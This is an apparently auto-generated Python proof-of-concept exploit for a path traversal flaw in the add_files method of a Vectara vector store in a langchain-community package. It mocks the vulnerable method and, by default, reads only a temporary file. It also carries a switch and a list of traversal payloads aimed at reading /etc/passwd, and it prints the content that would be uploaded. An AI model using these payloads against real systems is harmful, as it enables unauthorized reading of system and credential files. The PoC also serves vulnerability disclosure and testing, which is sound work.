#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-006
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The add_files() method in Vectara vector store directly uses
user-provided file paths in open() without path validation. An attacker can
supply paths like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign
test file) and showing the content would be exfiltrated to Vectara's API.
"""

import os
import sys
import json
import tempfile
import requests
from typing import List, Optional, Dict, Any
from unittest.mock import patch, MagicMock

# Configuration - change these as needed
TARGET_FILE = "/etc/passwd"  # Benign file to read (change to test other files)
VECTARA_CUSTOMER_ID = "test_customer"
VECTARA_CORPUS_ID = "test_corpus"
VECTARA_API_KEY = "test_api_key"

# For safe testing, create a temporary file to read instead of /etc/passwd
USE_SAFE_FILE = True  # Set to False to attempt reading /etc/passwd

class MockVectara:
    """
    Mock Vectara class that simulates the vulnerable behavior without
    actually calling the Vectara API. This demonstrates the LFI vulnerability
    by showing the file content that would be exfiltrated.
    """
    
    def __init__(self):
        self._vectara_customer_id = VECTARA_CUSTOMER_ID
        self._vectara_corpus_id = VECTARA_CORPUS_ID
        self._vectara_api_key = VECTARA_API_KEY
        self._session = requests.Session()
        self.vectara_api_timeout = 30
        
    def _get_post_headers(self) -> Dict[str, str]:
        """Simulate getting headers for Vectara API."""
        return {
            "Content-Type": "application/json",
            "x-api-key": self._vectara_api_key,
            "customer-id": self._vectara_customer_id,
        }
    
    def add_files(self, files_list: List[str], metadatas: Optional[List[Dict]] = None) -> List[str]:
        """
        VULNERABLE: Directly uses user-provided file paths in open() without validation.
        This is the exact vulnerable code from the library.
        """
        doc_ids = []
        for inx, file in enumerate(files_list):
            if not os.path.exists(file):
                print(f"[!] File {file} does not exist, skipping")
                continue
            
            md = metadatas[inx] if metadatas else {}
            
            # VULNERABILITY: Direct open() with user-controlled path
            print(f"[*] Attempting to read file: {file}")
            print(f"[*] File exists: {os.path.exists(file)}")
            print(f"[*] Absolute path: {os.path.abspath(file)}")
            
            # Show what would be exfiltrated (without actually sending to Vectara)
            try:
                with open(file, "rb") as f:
                    content = f.read()
                    print(f"[!] SUCCESS - Read {len(content)} bytes from {file}")
                    print(f"[!] Content preview (first 500 bytes):")
                    print("-" * 50)
                    print(content[:500].decode('utf-8', errors='replace'))
                    print("-" * 50)
                    
                    # This is what would be sent to Vectara's API
                    files_dict = {
                        "file": (file, content),
                        "doc_metadata": json.dumps(md),
                    }
                    print(f"[*] Would upload to Vectara API with filename: {file}")
                    print(f"[*] Metadata: {md}")
                    
            except Exception as e:
                print(f"[!] Error reading file {file}: {e}")
                continue
            
            # Simulate API response (would be real in actual exploit)
            doc_ids.append(f"mock_doc_id_{inx}")
            
        return doc_ids


def create_safe_test_file() -> str:
    """Create a temporary file with test content for safe demonstration."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write("This is a test file to demonstrate LFI vulnerability.\n")
        f.write("In a real attack, this would be /etc/passwd or other sensitive files.\n")
        f.write("Path traversal: ../../etc/passwd\n")
        temp_path = f.name
    return temp_path


def demonstrate_path_traversal():
    """
    Demonstrate the path traversal vulnerability by attempting to read
    files outside the intended directory.
    """
    print("=" * 70)
    print("LFI EXPLOIT DEMONSTRATION - langchain-community-only")
    print("=" * 70)
    print()
    
    # Create mock Vectara instance
    vectara = MockVectara()
    
    if USE_SAFE_FILE:
        # Create a safe test file to demonstrate the vulnerability
        safe_file = create_safe_test_file()
        print(f"[*] Created safe test file: {safe_file}")
        print()
        
        # Test 1: Normal file access (should work)
        print("[*] Test 1: Normal file access")
        vectara.add_files([safe_file])
        print()
        
        # Test 2: Path traversal to read the safe file using relative path
        print("[*] Test 2: Path traversal (relative path)")
        # Get the directory containing the safe file
        safe_dir = os.path.dirname(safe_file)
        safe_name = os.path.basename(safe_file)
        # Try to access it via path traversal
        traversal_path = os.path.join(safe_dir, "..", safe_dir.split(os.sep)[-1], safe_name)
        vectara.add_files([traversal_path])
        print()
        
        # Clean up
        os.unlink(safe_file)
        
    else:
        # Attempt to read /etc/passwd (requires permissions)
        print("[*] Attempting to read /etc/passwd via path traversal")
        print("[*] This demonstrates the actual vulnerability")
        print()
        
        # Test various path traversal patterns
        traversal_paths = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "/etc/passwd",
            "....//....//etc/passwd",
        ]
        
        for path in traversal_paths:
            print(f"[*] Trying: {path}")
            vectara.add_files([path])
            print()


def main():
    """Main function to run the PoC."""
    try:
        demonstrate_path_traversal()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
